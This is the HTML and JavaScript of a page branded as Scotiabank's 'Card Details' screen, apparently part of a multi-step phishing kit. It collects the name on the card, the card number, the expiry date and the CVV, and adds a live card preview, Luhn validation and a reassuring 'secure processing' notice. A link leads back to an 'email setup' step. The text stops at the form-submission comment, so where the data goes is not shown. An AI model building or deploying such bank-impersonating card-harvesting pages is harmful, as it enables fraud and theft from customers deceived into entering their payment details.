<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Card Details | Scotiabank</title>
    <style>
        .loading {
            display: none;
        }
        .loading.active {
            display: inline-block;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .error-message {
            display: none;
            color: #EB121A;
            font-size: 14px;
            margin-top: 5px;
        }
        .error-message.show {
            display: block;
        }
        .success-message {
            display: none;
            color: #02a95c;
            font-size: 14px;
            margin-top: 5px;
        }
        .success-message.show {
            display: block;
        }
        .input-group {
            margin-bottom: 32px;
        }
        .input-label {
            display: block;
            font-size: 18px;
            font-weight: 600;
            color: #1d1d1d;
            margin-bottom: 8px;
        }
        .input-field {
            width: 100%;
            padding: 12px 0;
            border: none;
            border-bottom: 2px solid #7a7a7a;
            font-size: 22px;
            color: #1d1d1d;
            background: transparent;
            outline: none;
        }
        .input-field:focus {
            border-bottom-color: #007EAB;
        }
        .input-field.error {
            border-bottom-color: #EB121A;
        }
        .input-field.success {
            border-bottom-color: #02a95c;
        }
        .input-icon {
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 2px solid #7a7a7a;
            position: relative;
        }
        .input-icon:focus-within {
            border-bottom-color: #007EAB;
        }
        .card-preview {
            background: linear-gradient(135deg, #007EAB 0%, #02a95c 100%);
            border-radius: 12px;
            padding: 24px;
            color: white;
            margin-bottom: 32px;
            box-shadow: 0 4px 12px rgba(0, 126, 171, 0.2);
        }
        .card-chip {
            width: 40px;
            height: 32px;
            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
            border-radius: 6px;
            margin-bottom: 20px;
            position: relative;
        }
        .card-chip:after {
            content: '';
            position: absolute;
            top: 6px;
            left: 6px;
            right: 6px;
            bottom: 6px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 3px;
        }
        .card-number {
            font-size: 24px;
            font-family: 'Courier New', monospace;
            letter-spacing: 2px;
            margin-bottom: 20px;
            min-height: 32px;
        }
        .card-details {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
        }
        .card-holder {
            text-transform: uppercase;
        }
        .card-expiry {
            text-align: right;
        }
        .card-vendor {
            position: absolute;
            right: 24px;
            top: 24px;
            font-size: 20px;
            font-weight: bold;
        }
        .card-input-group {
            display: flex;
            gap: 16px;
        }
        .card-input {
            flex: 1;
        }
        .card-number-input {
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
        }
        .cvv-toggle {
            position: absolute;
            right: 0;
            background: none;
            border: none;
            cursor: pointer;
            color: #7a7a7a;
        }
        .cvv-toggle:hover {
            color: #007EAB;
        }
        .card-type-icon {
            position: absolute;
            right: 0;
            color: #7a7a7a;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col bg-[#F6F7FC]">
    <div
        class="md:p-[20px] flex-1 flex flex-col md:justify-center items-center h-screen bg-[#FAFBFD]"
    >
        <div
            class="md:w-[600px] w-full md:mt-[60px] bg-[white] rounded-[8px] shadow-md md:p-[40px] p-[30px] flex flex-col items-center"
        >
            <div class="w-full flex items-end">
                <i data-lucide="credit-card" class="text-gray-700 ml-auto"></i>
            </div>
            
            <div class="text-center">
                <h1
                    class="mt-4 text-[1.6rem] leading-[3.5rem] font-[600] tracking-[-0.025rem] text-[rgb(51,51,51)]"
                    style="font-family: 'Scotia Headline', Arial, Helvetica, sans-serif"
                >
                    Card Details
                </h1>
                <p class="text-[#7a7a7a] text-[16px] mt-2">
                    Enter your payment card information securely
                </p>
            </div>
            
            <img
                src="data:image/png;base64,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"
                alt="Logo"
                class="h-[40px] mt-2"
            />

            <!-- Card Preview -->
            <div class="card-preview w-full mt-6 relative">
                <div class="card-chip"></div>
                <div class="card-number" id="cardPreviewNumber">
                    •••• •••• •••• ••••
                </div>
                <div class="card-details">
                    <div class="card-holder" id="cardPreviewName">
                        CARDHOLDER NAME
                    </div>
                    <div class="card-expiry" id="cardPreviewExpiry">
                        MM/YY
                    </div>
                </div>
                <div class="card-vendor" id="cardVendor">
                    VISA
                </div>
            </div>

            <form id="cardForm" class="w-full mt-[30px]">
                <!-- Name on Card -->
                <div class="input-group">
                    <label class="input-label">Name on Card</label>
                    <div class="input-icon">
                        <i data-lucide="user" class="text-gray-700 w-5 h-5"></i>
                        <input
                            type="text"
                            id="cardName"
                            class="input-field"
                            placeholder="Enter name as shown on card"
                            required
                        />
                    </div>
                    <div id="cardNameError" class="error-message"></div>
                </div>

                <!-- Card Number -->
                <div class="input-group">
                    <label class="input-label">Card Number</label>
                    <div class="input-icon">
                        <i data-lucide="credit-card" class="text-gray-700 w-5 h-5"></i>
                        <input
                            type="text"
                            id="cardNumber"
                            class="input-field card-number-input"
                            placeholder="1234 5678 9012 3456"
                            maxlength="19"
                            inputmode="numeric"
                            required
                        />
                        <i data-lucide="credit-card" class="card-type-icon w-5 h-5"></i>
                    </div>
                    <div id="cardNumberError" class="error-message"></div>
                </div>

                <!-- Expiration Date and CVV -->
                <div class="card-input-group">
                    <!-- Expiration Date -->
                    <div class="card-input">
                        <div class="input-group">
                            <label class="input-label">Expiration Date</label>
                            <div class="input-icon">
                                <i data-lucide="calendar" class="text-gray-700 w-5 h-5"></i>
                                <input
                                    type="text"
                                    id="cardExpiry"
                                    class="input-field"
                                    placeholder="MM/YY"
                                    maxlength="5"
                                    required
                                />
                            </div>
                            <div id="cardExpiryError" class="error-message"></div>
                        </div>
                    </div>

                    <!-- CVV -->
                    <div class="card-input">
                        <div class="input-group">
                            <label class="input-label">CVV</label>
                            <div class="input-icon">
                                <i data-lucide="lock-keyhole" class="text-gray-700 w-5 h-5"></i>
                                <input
                                    type="password"
                                    id="cardCVV"
                                    class="input-field"
                                    placeholder="123"
                                    maxlength="4"
                                    inputmode="numeric"
                                    required
                                />
                                <button type="button" id="toggleCVV" class="cvv-toggle">
                                    <i data-lucide="eye" class="w-5 h-5"></i>
                                </button>
                            </div>
                            <div id="cardCVVError" class="error-message"></div>
                        </div>
                    </div>
                </div>

                <!-- Card Type Information -->
                <div class="mb-8 p-4 bg-blue-50 rounded-lg">
                    <div class="flex items-start gap-3">
                        <i data-lucide="shield-check" class="text-[#007EAB] w-5 h-5 mt-1 flex-shrink-0"></i>
                        <div>
                            <p class="text-[#007EAB] text-[14px] font-[600] mb-1">
                                Secure Card Processing
                            </p>
                            <p class="text-[#7a7a7a] text-[13px]">
                                Your card details are encrypted and processed securely. Scotiabank never stores your CVV code.
                                For debit cards, you may need to complete additional verification.
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Success Message -->
                <div id="successMessage" class="success-message"></div>

                <!-- Submit Button -->
                <div class="w-full flex justify-center mt-[40px]">
                    <button
                        id="submitBtn"
                        type="submit"
                        class="w-[300px] bg-[#007EAB] px-[20px] py-[15px] rounded-[8px] flex items-center justify-center gap-2 hover:bg-[#006c92] transition-colors"
                    >
                        <svg class="loading w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        <span class="text-[white] text-[13px]">Add Card</span>
                    </button>
                </div>

                <!-- Back Link -->
                <a href="email.html" class="w-full flex justify-center mt-[20px] items-center">
                    <i data-lucide="chevron-left" class="text-[#03749D] w-5 h-5"></i>
                    <span class="text-[#03749D] text-[16px] font-[700] ml-2">
                        Back to Email Setup
                    </span>
                </a>
            </form>
        </div>

        <div class="md:flex block gap-[8px] mt-[50px] mb-[70px] text-center">
            <span>Need help with card details?</span>
            <br class="md:hidden"/>
            <a href="#" class="font-[600] text-[16px]">Contact our support team</a>
        </div>
    </div>

    <footer class="pt-6 pb-3 text-sm text-gray-600 bg-[white] shadow-md border border-1 hidden md:block">
        <div class="flex justify-between mb-4 py-[10px] px-[50px]">
            <div>
                <img class="h-9 w-13" src="data:image/png;base64,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" alt="">
            </div>
            <div class="flex gap-[20px] font-[300] flex-wrap">
                <a href="#">Contact Us</a>
                <a href="#">Security</a>
                <a href="#">Legal</a>
                <a href="#">Privacy</a>
                <a href="#">Accessibility</a>
                <a href="#">Cookie Settings</a>
            </div>
        </div>

        <hr class="mt-4 mb-3" />

        <div class="flex justify-end px-[20px]">
            <span class="text-[12px]">© Scotiabank. All Rights Reserved.</span>
        </div>
    </footer>

    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    <script>
        // Initialize Lucide icons
        lucide.createIcons();
        
        // CVV toggle functionality
        document.getElementById('toggleCVV').addEventListener('click', function() {
            const cvvInput = document.getElementById('cardCVV');
            const icon = this.querySelector('i');
            
            if (cvvInput.type === 'password') {
                cvvInput.type = 'text';
                icon.setAttribute('data-lucide', 'eye-off');
            } else {
                cvvInput.type = 'password';
                icon.setAttribute('data-lucide', 'eye');
            }
            lucide.createIcons();
        });
        
        // Format card number with spaces
        function formatCardNumber(value) {
            // Remove all non-digits
            const digits = value.replace(/\D/g, '');
            
            // Add space after every 4 digits
            let formatted = '';
            for (let i = 0; i < digits.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formatted += ' ';
                }
                formatted += digits[i];
            }
            
            return formatted;
        }
        
        // Format expiration date
        function formatExpiryDate(value) {
            // Remove all non-digits
            const digits = value.replace(/\D/g, '');
            
            let formatted = '';
            for (let i = 0; i < digits.length; i++) {
                if (i === 2) {
                    formatted += '/';
                }
                formatted += digits[i];
            }
            
            return formatted;
        }
        
        // Detect card type
        function detectCardType(cardNumber) {
            const cleaned = cardNumber.replace(/\s/g, '');
            
            // Visa: starts with 4
            if (/^4/.test(cleaned)) {
                return {
                    type: 'VISA',
                    icon: 'credit-card',
                    color: '#1a1f71'
                };
            }
            
            // MasterCard: starts with 51-55 or 2221-2720
            if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) {
                return {
                    type: 'MASTERCARD',
                    icon: 'credit-card',
                    color: '#eb001b'
                };
            }
            
            // American Express: starts with 34 or 37
            if (/^3[47]/.test(cleaned)) {
                return {
                    type: 'AMEX',
                    icon: 'credit-card',
                    color: '#0079c1'
                };
            }
            
            // Discover: starts with 6011, 65, or 644-649
            if (/^6011/.test(cleaned) || /^65/.test(cleaned) || /^64[4-9]/.test(cleaned)) {
                return {
                    type: 'DISCOVER',
                    icon: 'credit-card',
                    color: '#ff6000'
                };
            }
            
            // Default
            return {
                type: 'CARD',
                icon: 'credit-card',
                color: '#007EAB'
            };
        }
        
        // Update card preview
        function updateCardPreview() {
            const cardName = document.getElementById('cardName').value || 'CARDHOLDER NAME';
            const cardNumber = document.getElementById('cardNumber').value || '•••• •••• •••• ••••';
            const cardExpiry = document.getElementById('cardExpiry').value || 'MM/YY';
            
            // Update preview elements
            document.getElementById('cardPreviewName').textContent = cardName.toUpperCase();
            document.getElementById('cardPreviewNumber').textContent = cardNumber;
            document.getElementById('cardPreviewExpiry').textContent = cardExpiry;
            
            // Update card vendor based on number
            if (cardNumber.replace(/\s/g, '').length >= 1) {
                const cardType = detectCardType(cardNumber);
                document.getElementById('cardVendor').textContent = cardType.type;
                
                // Update card type icon
                const iconElement = document.querySelector('.card-type-icon');
                iconElement.setAttribute('data-lucide', cardType.icon);
                lucide.createIcons();
            }
        }
        
        // Validate card number using Luhn algorithm
        function validateCardNumber(cardNumber) {
            const cleaned = cardNumber.replace(/\s/g, '');
            
            // Check if it's all digits and has correct length
            if (!/^\d+$/.test(cleaned)) {
                return false;
            }
            
            // Check length based on card type
            const cardType = detectCardType(cleaned);
            if (cardType.type === 'AMEX') {
                if (cleaned.length !== 15) return false;
            } else {
                if (cleaned.length !== 16) return false;
            }
            
            // Luhn algorithm
            let sum = 0;
            let shouldDouble = false;
            
            // Loop through values from the rightmost digit
            for (let i = cleaned.length - 1; i >= 0; i--) {
                let digit = parseInt(cleaned.charAt(i));
                
                if (shouldDouble) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            
            return (sum % 10) === 0;
        }
        
        // Validate expiration date
        function validateExpiryDate(expiry) {
            const match = expiry.match(/^(\d{2})\/(\d{2})$/);
            if (!match) return false;
            
            const month = parseInt(match[1]);
            const year = parseInt(match[2]);
            
            // Check month is valid
            if (month < 1 || month > 12) return false;
            
            // Check date is not in the past
            const now = new Date();
            const currentYear = now.getFullYear() % 100;
            const currentMonth = now.getMonth() + 1;
            
            if (year < currentYear) return false;
            if (year === currentYear && month < currentMonth) return false;
            
            // Check date is not too far in the future (10 years)
            if (year > currentYear + 10) return false;
            
            return true;
        }
        
        // Validate CVV
        function validateCVV(cvv, cardNumber) {
            const cleanedCVV = cvv.replace(/\D/g, '');
            const cleanedCard = cardNumber.replace(/\s/g, '');
            
            // Check if it's all digits
            if (!/^\d+$/.test(cleanedCVV)) {
                return false;
            }
            
            // Check length based on card type
            const cardType = detectCardType(cleanedCard);
            if (cardType.type === 'AMEX') {
                return cleanedCVV.length === 4;
            } else {
                return cleanedCVV.length === 3;
            }
        }
        
        // Clear all error messages
        function clearErrors() {
            const errorElements = document.querySelectorAll('.error-message');
            errorElements.forEach(el => {
                el.classList.remove('show');
                el.textContent = '';
            });
            
            const inputElements = document.querySelectorAll('.input-field');
            inputElements.forEach(el => {
                el.classList.remove('error');
                el.classList.remove('success');
            });
        }
        
        // Show error for specific field
        function showError(fieldId, message) {
            const errorElement = document.getElementById(fieldId + 'Error');
            const inputElement = document.getElementById(fieldId);
            
            if (errorElement) {
                errorElement.textContent = message;
                errorElement.classList.add('show');
            }
            
            if (inputElement) {
                inputElement.classList.add('error');
            }
        }
        
        // Show success for specific field
        function showSuccess(fieldId) {
            const inputElement = document.getElementById(fieldId);
            if (inputElement) {
                inputElement.classList.remove('error');
                inputElement.classList.add('success');
            }
        }
        
        // Form submission
